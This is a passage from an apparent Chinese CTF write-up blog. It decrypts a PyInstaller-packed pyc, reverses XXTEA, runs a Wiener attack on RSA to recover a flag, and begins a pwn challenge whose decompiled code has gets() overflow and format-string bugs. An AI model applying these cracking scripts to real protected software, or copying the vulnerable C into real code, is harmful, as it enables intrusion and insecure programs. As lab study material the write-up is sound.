class="number">1283577465</span>, <span class="number">2045007203</span>, <span class="number">3957761944</span>, <span class="number">3767891405</span>, <span class="number">2917089623</span>, <span class="number">3296133521</span>, <span class="number">482297421</span>, <span class="number">1734231412</span>, <span class="number">3670478932</span>, <span class="number">2575334979</span>, <span class="number">2827842737</span>, <span class="number">3413631016</span>, <span class="number">1533519803</span>, <span class="number">4008428470</span>, <span class="number">3890643173</span>, <span class="number">272960248</span>, <span class="number">317508587</span>, <span class="number">3299937500</span>, <span class="number">2440520601</span>, <span class="number">27470488</span>, <span class="number">1666674386</span>, <span class="number">1737927609</span>, <span class="number">750987808</span>, <span class="number">2385923471</span>, <span class="number">2694339191</span>, <span class="number">562925334</span>, <span class="number">2206035395</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(cipher):</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ii <span class="keyword">in</span> c[i:i+<span class="number">4</span>]:</span><br><span class="line">tmp = <span class="built_in">ord</span>(ii) + tmp &lt;&lt; <span class="number">8</span>  </span><br><span class="line">s.append(tmp)</span><br><span class="line">i = i+<span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> i &lt; <span class="built_in">len</span>(cipher):      </span><br><span class="line">key = [<span class="number">54</span>, <span class="number">54</span>, <span class="number">54</span>, <span class="number">54</span>]</span><br><span class="line">s_len = <span class="built_in">len</span>(s)</span><br><span class="line">res = encrypt(s_len, s, key)</span><br><span class="line"><span class="keyword">if</span> s == cipher:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You are right!&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> quit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Why not drink a cup of tea and have a rest?&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>程序首先将输入进行<code>rsa</code>加密，不过公钥指数很大，维纳攻击可以得到私钥。后面将密文按<code>32bytes</code>为单位切分成列表，最后将列表经过<code>encrypt</code>处理后与<code>cipher</code>对比。<code>encrypt</code>函数应该是<code>cup</code>里的函数，因为打包的<code>elf</code>会将所有调用的文件全部打包，所以<code>encrypt</code>一定在解包的文件里面。</p><p><strong>注意</strong>：如果解包时<code>python</code>版本不一致会导致文件丢失。</p><p>参考<a href="https://bbs.pediy.com/thread-271253.htm">https://bbs.pediy.com/thread-271253.htm</a></p><p><code>python</code>打包有两种模式，一种是无<code>-key</code>参数的，一种是有<code>-key</code>参数的。</p><blockquote><p>有-key参数的逆向<br>由于Pyinstaller是个开源的包，这也给我们逆向提供了便利</p><p>在官方给出的用法中，有给出-key这个参数，说是可以将文件pyc进行一定的压缩加密，以防止被逆向</p><p>Pyinstaller这个库本身的打包原理大概就是先将py编译成pyc，然后部分压缩成pyz，程序再通过对pyc和pyz的调用</p></blockquote><p>其中<code>pyimod02_archive.pyc</code>文件，是对<code>pyz</code>文件的加密代码，加密方式是<code>tinyaes</code>,<code>pyimod00_crypto_key.pyc</code>是加密密钥。使用<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a> 反编译得到<code>key=&#39;0000000000000tea&#39;</code></p><p>找到解压目录下<code>./PYZ-00.pyz_extracted/cup.pyc.encrypted</code>，使用<code>tinaes</code>进行解密</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"> </span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"><span class="comment"># 从crypt_key.pyc获取key，也可自行反编译获取</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;0000000000000tea&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;cup.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># 打开加密文件</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;output.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># 输出文件</span></span><br><span class="line"><span class="comment"># 按加密块大小进行读取</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line">cipher = tinyaes.AES(key, iv)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</span><br><span class="line"><span class="comment"># 补pyc头(最后自己补也行)</span></span><br><span class="line">outf.write(<span class="string">b&#x27;\x6f\x0d\x0d\x0a\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>)</span><br><span class="line"><span class="comment"># 写入解密数据</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在使用在线反编译或者<code>pycdc</code>反编译得到<code>encrypt</code>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span></span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[p &amp; <span class="number">3</span> ^ e.value] ^ z.value)</span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">ᘗ, ᘖ, ᘘ</span>):</span></span><br><span class="line">    ᘜ = <span class="number">0x9E3779B9L</span></span><br><span class="line">    ᘛ = <span class="number">6</span> + <span class="number">52</span> // ᘗ</span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    ᘔ = c_uint32(ᘖ[ᘗ - <span class="number">1</span>])</span><br><span class="line">    ᘕ = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ᘛ &gt; <span class="number">0</span>:</span><br><span class="line">        total.value += ᘜ</span><br><span class="line">        ᘕ.value = total.value &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        ᘚ = c_uint32(ᘖ[<span class="number">0</span>])</span><br><span class="line">        ᘖ[ᘗ - <span class="number">1</span>] = c_uint32(ᘖ[ᘗ - <span class="number">1</span>] + MX(ᘔ, ᘚ, total, ᘘ, ᘗ - <span class="number">1</span>, ᘕ).value).value</span><br><span class="line">        ᘔ.value = ᘖ[ᘗ - <span class="number">1</span>]</span><br><span class="line">        ᘛ -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ᘛ &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> ᘖ</span><br></pre></td></tr></table></figure><p><code>encrypt</code>是一个标准的<code>xxtea</code>算法。</p><p>直接解密即可得到<code>RSA</code>加密后的密文，因为公钥指数很大， 使用维纳攻击得到私钥，从而得到<code>flag</code></p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxtea_decrypt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea_decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k =  [ <span class="number">54</span>,         <span class="number">54</span>,         <span class="number">54</span>,         <span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">v = [<span class="number">0xD28ED952</span>, <span class="number">1472742623</span>, <span class="number">0xD91BA938</span>, <span class="number">0xF9F3BD2D</span>, <span class="number">0x8EF8E43D</span>, <span class="number">617653972</span>, <span class="number">1474514999</span>, <span class="number">1471783658</span>, <span class="number">1012864704</span>, <span class="number">0xD7821910</span>, <span class="number">993855884</span>, <span class="number">438456717</span>, <span class="number">0xC83555B7</span>, <span class="number">0xE8DFF468</span>, <span class="number">198959101</span>, <span class="number">0xC5B84FEB</span>, <span class="number">0xD9F837C6</span>, <span class="number">613157871</span>, <span class="number">0x8EFA4EDD</span>, <span class="number">97286225</span>, <span class="number">0x8B4B608C</span>, <span class="number">1471645170</span>, <span class="number">0xC0B62792</span>, <span class="number">583597118</span>, <span class="number">0xAAB1C22D</span>, <span class="number">0xBDB9C266</span>, <span class="number">1384330715</span>, <span class="number">0xAE9F9816</span>, <span class="number">0xD1F40B3C</span>, <span class="number">0x8206DDC3</span>, <span class="number">0xC4E0BADC</span>, <span class="number">0xE407BD26</span>, <span class="number">145643141</span>, <span class="number">0x8016C6A5</span>, <span class="number">0xAF4AB9D3</span>, <span class="number">506798154</span>, <span class="number">994590281</span>, <span class="number">0x85082A0B</span>, <span class="number">0xCA0BC95A</span>, <span class="number">0xA7BE567C</span>, <span class="number">1105937096</span>, <span class="number">1789727804</span>, <span class="number">0xDFEFB591</span>, <span class="number">0x93346B38</span>, <span class="number">1162286478</span>, <span class="number">680814033</span>, <span class="number">0xAEE1A7A2</span>, <span class="number">0x80E574AE</span>, <span class="number">0xF154F55F</span>, <span class="number">2121620700</span>, <span class="number">0xFCBDA653</span>, <span class="number">0x8E902444</span>, <span class="number">0xCA742E12</span>, <span class="number">0xB8424071</span>, <span class="number">0xB4B15EC2</span>, <span class="number">0x943BFA09</span>, <span class="number">0xBC97CD93</span>, <span class="number">1285603712</span>, <span class="number">798920280</span>, <span class="number">0x8B58328F</span>, <span class="number">0xF9822360</span>, <span class="number">0xD1FD15EE</span>, <span class="number">1077514121</span>, <span class="number">1436444106</span>, <span class="number">0xA2D6C17E</span>, <span class="number">1507202797</span>, <span class="number">500756149</span>, <span class="number">198754565</span>, <span class="number">0x8E014807</span>, <span class="number">880454148</span>, <span class="number">1970517398</span>, <span class="number">0xBFC6EE25</span>, <span class="number">1161840191</span>, <span class="number">560498076</span>, <span class="number">1782600856</span>, <span class="number">0x9D93FEBE</span>, <span class="number">1285196205</span>, <span class="number">788797746</span>, <span class="number">1195724574</span>, <span class="number">0xF2174A07</span>, <span class="number">103427523</span>, <span class="number">0x952BFE83</span>, <span class="number">0xF730AC4C</span>, <span class="number">617564657</span>, <span class="number">978211984</span>, <span class="number">1781482121</span>, <span class="number">0x8379D23A</span>, <span class="number">0xEAD737EE</span>, <span class="number">0xE41555FB</span>, <span class="number">659557668</span>, <span class="number">0x99F3B244</span>, <span class="number">1561884856</span>, <span class="number">0x842C31A4</span>, <span class="number">1189296962</span>, <span class="number">169145316</span>, <span class="number">0xA5CE044C</span>, <span class="number">1323893433</span>, <span class="number">824667876</span>, <span class="number">408202876</span>, <span class="number">0xE0178482</span>, <span class="number">0xF412BBBC</span>, <span class="number">1508996065</span>, <span class="number">162419237</span>, <span class="number">0xDE740B00</span>, <span class="number">0xB7CB64FD</span>, <span class="number">0xEBCADB1F</span>, <span class="number">0x8EAE2326</span>, <span class="number">0x933C216C</span>, <span class="number">0xD7D1F649</span>, <span class="number">481927014</span>, <span class="number">0xA448AC16</span>, <span class="number">0xBC082807</span>, <span class="number">1261069441</span>, <span class="number">2063238535</span>, <span class="number">0x8474A61D</span>, <span class="number">101459755</span>, <span class="number">0xBC5654D1</span>, <span class="number">1721190841</span>, <span class="number">1078395785</span>, <span class="number">176506553</span>, <span class="number">0xD3C5280F</span>, <span class="number">1566142515</span>, <span class="number">1938949000</span>, <span class="number">1499289517</span>, <span class="number">0xC59872F8</span>, <span class="number">829714860</span>, <span class="number">0xE51502A2</span>, <span class="number">952932374</span>, <span class="number">1283577465</span>, <span class="number">2045007203</span>, <span class="number">0xEBE6A798</span>, <span class="number">0xE09575CD</span>, <span class="number">0xADDF4157</span>, <span class="number">0xC4770191</span>, <span class="number">482297421</span>, <span class="number">1734231412</span>, <span class="number">0xDAC71054</span>, <span class="number">0x99807E43</span>, <span class="number">0xA88D74B1</span>, <span class="number">0xCB77E028</span>, <span class="number">1533519803</span>, <span class="number">0xEEEBC3B6</span>, <span class="number">0xE7E680E5</span>, <span class="number">272960248</span>, <span class="number">317508587</span>, <span class="number">0xC4B10CDC</span>, <span class="number">0x91776399</span>, <span class="number">27470488</span>, <span class="number">1666674386</span>, <span class="number">1737927609</span>, <span class="number">750987808</span>, <span class="number">0x8E364D8F</span>, <span class="number">0xA0985A77</span>, <span class="number">562925334</span>, <span class="number">0x837D6DC3</span>]</span><br><span class="line">xxtea_decrypt(v, k)</span><br><span class="line"><span class="built_in">print</span>((v))</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">c += long_to_bytes(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">x, y</span>):</span>  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fraction</span>(<span class="params">sub_res</span>):</span></span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">        denominator, numerator = numerator, i * numerator + denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 求解每个渐进分数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_fraction</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span>(<span class="params">a, b, c</span>):</span>  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line"> </span><br><span class="line">pub_key = [<span class="number">0x649EE967E7916A825CC9FD3320BEABF263BEAC68C080F52824A0F521EDB6B78577EC52BF1C9E78F4BB71192F9A23F1A17AA76E5979E4D953329D3CA65FB4A71DA57412B59DFD6AEDF0191C5555D3E5F582B81B5E6B23163E9889204A81AFFDF119FE25C92F4ED59BD3285BCD7AAE14824240D2E33C5A97848F4EB7AAC203DE6330D2B4D8FF61691544FBECD120F99A157B3D2F58FA51B2887A9D06CA383C44D071314A12B17928B96F03A06E959A5AFEFA0183664F52CD32B9FC72A04B45913FCB2D5D2D3A415A14F611CF1EAC2D6C785142A8E9CC41B67A6CD85001B06EDB8CA767D367E56E0AE651491BF8A8C17A38A1835DB9E4A9292B1D86D5776C98CC25</span>, <span class="number">0x647327833ACFEF1F9C83E74E171FC300FA347D4A6769476C33DA82C95120ACB38B62B33D429206FE6E9BB0BB7AB748A1036971BEA36EC47130B749C1C9FF6FE03D0F7D9FC5346EB0E575BDFA6C530AA57CD676894FC080D2DD049AB59625F4B9C78BCFD95CDCD2793E440E26E189D251121CB6EB177FEDB596409034E8B0C5BBD9BD9342235DBB226C9170EFE347FF0FD2CFF9A1F7B647CC83E4D8F005FD7125A89251C768AFE70BDD54B88116814D5030F499BCAC4673CCCC342FB4B6AC58EA5A64546DC25912B6C430529F6A7F449FD96536DE269D1A1B015A4AC6B6E46EE19DCE8143726A6503E290E4BAE6BD78319B5878981F6CFFDB3B818209341FD68B</span>]</span><br><span class="line">d = wienerAttack(pub_key[<span class="number">1</span>], pub_key[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># cc = pow(12312341242351,pub_key[1], pub_key[0])</span></span><br><span class="line"><span class="comment"># print(cc)</span></span><br><span class="line"><span class="comment"># print(pow(cc,d,pub_key[0]))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d =&quot;</span>, d)</span><br><span class="line">c = <span class="built_in">int</span>(c)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, pub_key[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(m, long_to_bytes(m ))</span><br><span class="line"><span class="comment">#flag&#123;You_Need_Some_Tea&#125;</span></span><br></pre></td></tr></table></figure><p><strong>flag</strong>:<code>flag&#123;You_Need_Some_Tea&#125;</code></p><p>新学到一种方法可以提取出<code>pyc</code>, 参考<a href="https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries">https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objcopy --dump-section pydata=pydata.dump testfile.elf</span><br></pre></td></tr></table></figure><p>之后也是用<code>pyinstxtractor</code>解压，后面步骤都一样。这个也需要<code>python</code>版本一致。</p><h1 id="good-luck"><a href="#good-luck" class="headerlink" title="good_luck"></a>good_luck</h1><p> 远程有大问题，本地早就打通了，远程一直到比赛结束都没打通。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">luck$</span><span class="bash"> checksec luck</span></span><br><span class="line">[*] &#x27;/home/pwn/\xe6\xa1\x8c\xe9\x9d\xa2/tmp/storge/luck&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck&quot;</span>);</span><br><span class="line">  v1 = rand() % <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    fmt();</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    int __cdecl fmt()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      char ad[100]; // [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"><span class="comment">      puts(&quot;fmt&quot;);</span></span><br><span class="line"><span class="comment">      __isoc99_scanf(&quot;%s&quot;, ad);</span></span><br><span class="line"><span class="comment">      printf(ad);</span></span><br><span class="line"><span class="comment">      return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    overflow();</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    int __cdecl overflow()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      char s[80]; // [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"><span class="comment">      puts(&quot;luck!&quot;);</span></span><br><span class="line"><span class="comment">      gets(s);</span></span><br><span class="line"><span class="comment">      return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKk,YOU ARE VERY NB!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 